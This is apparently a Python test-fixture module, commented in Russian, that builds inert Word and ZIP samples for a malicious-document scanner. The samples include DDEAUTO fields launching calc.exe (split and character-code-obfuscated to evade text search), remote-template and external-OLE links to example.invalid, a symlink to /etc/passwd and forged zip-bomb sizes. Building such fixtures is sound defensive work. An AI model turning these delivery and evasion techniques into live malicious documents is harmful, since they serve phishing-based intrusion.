"""Синтетические документы Word и архивы для тестов M6.

Собираются из заведомо минимальной разметки: каждый образец содержит ровно
тот механизм, который проверяет, и ничего сверх. Настоящих вредоносов здесь
нет — макрос это пустой `vbaProject.bin`, DDE вызывает `calc`, адреса ведут
в зарезервированный домен `example.invalid`.
"""

from __future__ import annotations

import io
import struct
import zipfile

W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
MAIN = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
MAIN_MACRO = "application/vnd.ms-word.document.macroEnabled.main+xml"

_HEAD = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'


def paragraph(text: str) -> str:
    return f'<w:p><w:r><w:t xml:space="preserve">{text}</w:t></w:r></w:p>'


def field(instruction_parts: list[str], result: str = "") -> str:
    """Сложное поле, инструкция которого разрезана на куски."""
    instr = "".join(
        f'<w:r><w:instrText xml:space="preserve">{part}</w:instrText></w:r>'
        for part in instruction_parts
    )
    return (
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        f"{instr}"
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
        f"<w:r><w:t>{result}</w:t></w:r>"
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    )


def docx(
    body: str = "",
    *,
    rels: list[tuple[str, str, str, bool]] = (),  # type: ignore[assignment]
    parts: dict[str, bytes] | None = None,
    overrides: dict[str, str] | None = None,
    settings_rels: list[tuple[str, str, str, bool]] = (),  # type: ignore[assignment]
    settings: str = "",
    main_type: str = MAIN,
    document_xml: str | None = None,
) -> bytes:
    """Минимальный документ Word.

    `rels` — связи основной части: (id, тип, цель, внешняя ли).
    """
    overrides = dict(overrides or {})
    overrides["/word/document.xml"] = main_type
    if settings or settings_rels:
        overrides["/word/settings.xml"] = (
            "application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"
        )
    types = (
        f'{_HEAD}<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" '
        'ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Default Extension="png" ContentType="image/png"/>'
        '<Default Extension="bin" ContentType="application/vnd.ms-office.oleObject"/>'
        + "".join(
            f'<Override PartName="{name}" ContentType="{value}"/>'
            for name, value in overrides.items()
        )
        + "</Types>"
    )
    package_rels = (
        f'{_HEAD}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        f'<Relationship Id="rId1" Type="{REL}officeDocument" Target="word/document.xml"/>'
        "</Relationships>"
    )
    document = document_xml or (
        f'{_HEAD}<w:document xmlns:w="{W}" xmlns:r="{R}" '
        'xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" '
        'xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" '
        'xmlns:o="urn:schemas-microsoft-com:office:office" '
        'xmlns:v="urn:schemas-microsoft-com:vml" '
        'xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" '
        'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" '
        'xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture" '
        f'mc:Ignorable="w14"><w:body>{body}<w:sectPr/></w:body></w:document>'
    )
    main_rels = list(rels)
    if settings or settings_rels:
        main_rels.append(("rIdSettings", f"{REL}settings", "settings.xml", False))

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", types)
        zf.writestr("_rels/.rels", package_rels)
        zf.writestr("word/document.xml", document)
        if main_rels:
            zf.writestr("word/_rels/document.xml.rels", _rels(main_rels))
        if settings or settings_rels:
            zf.writestr(
                "word/settings.xml",
                f'{_HEAD}<w:settings xmlns:w="{W}" xmlns:r="{R}">{settings}</w:settings>',
            )
        if settings_rels:
            zf.writestr("word/_rels/settings.xml.rels", _rels(settings_rels))
        for name, data in (parts or {}).items():
            zf.writestr(name, data)
    return buffer.getvalue()


def _rels(items: list[tuple[str, str, str, bool]]) -> str:
    body = "".join(
        f'<Relationship Id="{rid}" Type="{kind}" Target="{target}"'
        + (' TargetMode="External"' if external else "")
        + "/>"
        for rid, kind, target, external in items
    )
    return (
        f'{_HEAD}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        f"{body}</Relationships>"
    )


def png(size: tuple[int, int] = (8, 8)) -> bytes:
    from PIL import Image

    buffer = io.BytesIO()
    Image.new("RGB", size, (120, 30, 200)).save(buffer, "PNG")
    return buffer.getvalue()


# --- готовые образцы ---


def clean_docx() -> bytes:
    return docx(paragraph("Договор аренды") + field(["PAGE"], "1"))


def macro_docm() -> bytes:
    return docx(
        paragraph("Документ с макросом"),
        rels=[("rIdVba", "http://schemas.microsoft.com/office/2006/relationships/vbaProject",
               "vbaProject.bin", False)],
        parts={"word/vbaProject.bin": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504},
        overrides={"/word/vbaProject.bin": "application/vnd.ms-office.vbaProject"},
        main_type=MAIN_MACRO,
    )  # fmt: skip


def dde_docx() -> bytes:
    """DDEAUTO, разрезанный на куски: поиск по тексту части его не найдёт."""
    return docx(paragraph("Счёт") + field(["DD", "EAU", 'TO c:\\\\windows\\\\calc.exe "x"'], "!"))


def dde_simple_docx() -> bytes:
    return docx('<w:p><w:fldSimple w:instr="DDEAUTO calc x"><w:r><w:t>1</w:t></w:r>'
                "</w:fldSimple></w:p>")  # fmt: skip


def obfuscated_field_docx() -> bytes:
    """Имя внешнего поля собирает вложенное `QUOTE` из кодов символов."""
    inner = field(["QUOTE 68 68 69 65 85 84 79"], "DDEAUTO")
    # Вложенное поле — в начале инструкции внешнего, в том же абзаце.
    inner_runs = inner.removeprefix("<w:p>").removesuffix("</w:p>")
    body = (
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        f"{inner_runs}"
        '<w:r><w:instrText xml:space="preserve"> calc x</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
        "<w:r><w:t>видимое</w:t></w:r>"
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    )
    return docx(body)


def remote_template_docx() -> bytes:
    return docx(
        paragraph("Резюме"),
        settings='<w:attachedTemplate r:id="rIdTpl"/>',
        settings_rels=[("rIdTpl", f"{REL}attachedTemplate",
                        "https://example.invalid/t.dotm", True)],
    )  # fmt: skip


def local_template_docx() -> bytes:
    """Шаблон с диска автора — норма, признаком не считается."""
    return docx(
        paragraph("Отчёт"),
        settings='<w:attachedTemplate r:id="rIdTpl"/>',
        settings_rels=[("rIdTpl", f"{REL}attachedTemplate",
                        "file:///C:/Users/a/Templates/Report.dotx", True)],
    )  # fmt: skip


def remote_object_docx() -> bytes:
    """Внешний OLE-объект — механизм CVE-2017-0199 и Follina."""
    body = (
        '<w:p><w:r><w:object><o:OLEObject Type="Link" ProgID="Word.Document.8" '
        'r:id="rIdOle"/></w:object></w:r></w:p>'
    )
    return docx(
        paragraph("Накладная") + body,
        rels=[("rIdOle", f"{REL}oleObject", "http://example.invalid/x.html!", True)],
    )


def embedded_ole_docx() -> bytes:
    body = (
        '<w:p><w:r><w:object><v:shape id="s1"><v:imagedata r:id="rIdImg"/></v:shape>'
        '<o:OLEObject Type="Embed" ProgID="Equation.3" r:id="rIdOle"/></w:object></w:r></w:p>'
    )
    return docx(
        paragraph("Формула") + body,
        rels=[
            ("rIdOle", f"{REL}oleObject", "embeddings/oleObject1.bin", False),
            ("rIdImg", f"{REL}image", "media/image1.png", False),
        ],
        parts={
            "word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504,
            "word/media/image1.png": png(),
        },
    )


def image_docx() -> bytes:
    drawing = (
        '<w:p><w:r><w:drawing><wp:inline><wp:extent cx="914400" cy="914400"/>'
        '<wp:docPr id="1" name="p"/><a:graphic><a:graphicData '
        'uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic>'
        '<pic:nvPicPr><pic:cNvPr id="1" name="p"/><pic:cNvPicPr/></pic:nvPicPr>'
        '<pic:blipFill><a:blip r:embed="rIdImg"/></pic:blipFill><pic:spPr/></pic:pic>'
        "</a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>"
    )
    table = (
        "<w:tbl><w:tr><w:tc><w:p><w:r><w:t>ячейка 1</w:t></w:r></w:p></w:tc>"
        "<w:tc><w:p><w:r><w:rPr><w:b/></w:rPr><w:t>ячейка 2</w:t></w:r></w:p></w:tc></w:tr>"
        "<w:tr><w:tc><w:p><w:r><w:t>ячейка 3</w:t></w:r></w:p></w:tc></w:tr></w:tbl>"
    )
    return docx(
        paragraph("Скан паспорта") + drawing + table,
        rels=[("rIdImg", f"{REL}image", "media/image1.png", False)],
        parts={"word/media/image1.png": png((16, 12))},
    )


def altchunk_docx() -> bytes:
    return docx(
        paragraph("Письмо") + '<w:altChunk r:id="rIdChunk"/>',
        rels=[("rIdChunk", f"{REL}aFChunk", "afchunk.rtf", False)],
        parts={"word/afchunk.rtf": b"{\\rtf1 {\\object\\objemb}}"},
        overrides={"/word/afchunk.rtf": "application/rtf"},
    )


def dtd_docx() -> bytes:
    """DTD с сущностью в основной части. Раскрываться она не должна."""
    document = (
        f'{_HEAD}<!DOCTYPE w:document [<!ENTITY x "xxxxxxxxxx">]>'
        f'<w:document xmlns:w="{W}"><w:body><w:p><w:r><w:t>&x;</w:t></w:r></w:p>'
        "</w:body></w:document>"
    )
    return docx(document_xml=document)


# --- архивы ---


def zip_of(members: dict[str, bytes], *, compression: int = zipfile.ZIP_DEFLATED) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression) as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    return buffer.getvalue()


def zip_with_symlink() -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as zf:
        info = zipfile.ZipInfo("link")
        info.create_system = 3
        info.external_attr = 0o120777 << 16
        zf.writestr(info, "/etc/passwd")
    return buffer.getvalue()


def with_declared_size(data: bytes, size: int) -> bytes:
    """Подменяет заявленный размер каждой записи в центральном каталоге.

    Так собирается архив, обещающий гигабайты, без того чтобы их сжимать:
    опись обязана поймать его до распаковки. Выше 4 ГБ на запись ZIP без
    ZIP64 не выражает, поэтому «10 ГБ» — это три записи по 3.5 ГБ.
    """
    raw = bytearray(data)
    offset = 0
    while (found := raw.find(b"PK\x01\x02", offset)) != -1:
        struct.pack_into("<I", raw, found + 24, size)
        offset = found + 4
    return bytes(raw)


def mark_encrypted(data: bytes) -> bytes:
    """Ставит флаг «зашифровано» у всех записей — и в локальных, и в каталоге."""
    raw = bytearray(data)
    for signature, flag_offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        offset = 0
        while (found := raw.find(signature, offset)) != -1:
            flags = struct.unpack_from("<H", raw, found + flag_offset)[0]
            struct.pack_into("<H", raw, found + flag_offset, flags | 0x1)
            offset = found + 4
    return bytes(raw)


# --- то, что ищут правила YARA (rules/yara/office.yar) ---

EQUATION_CLSID = bytes.fromhex("02CE020000000000C000000000000046")


def equation_editor_docx() -> bytes:
    """Объект Equation 3.0. Внутри — только заголовок OLE и CLSID, без эксплойта."""
    body = (
        '<w:p><w:r><w:object><o:OLEObject Type="Embed" ProgID="Equation.3" '
        'r:id="rIdOle"/></w:object></w:r></w:p>'
    )
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 72 + EQUATION_CLSID + b"\x00" * 424
    return docx(
        paragraph("Расчёт") + body,
        rels=[("rIdOle", f"{REL}oleObject", "embeddings/oleObject1.bin", False)],
        parts={"word/embeddings/oleObject1.bin": ole},
    )


def docvar_payload_docm() -> bytes:
    """Макрос и длинный base64 в переменной документа — схема дроппера.

    Нагрузка — повторённая строка, а не исполняемый код.
    """
    import base64

    blob = base64.b64encode(b"not a payload, just filler " * 80).decode()
    macro = macro_docm()
    buffer = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(macro)) as src, zipfile.ZipFile(buffer, "w") as out:
        for item in src.infolist():
            out.writestr(item, src.read(item.filename))
        out.writestr(
            "word/settings.xml",
            f'{_HEAD}<w:settings xmlns:w="{W}"><w:docVars>'
            f'<w:docVar w:name="cfg" w:val="{blob}"/></w:docVars></w:settings>',
        )
    return buffer.getvalue()
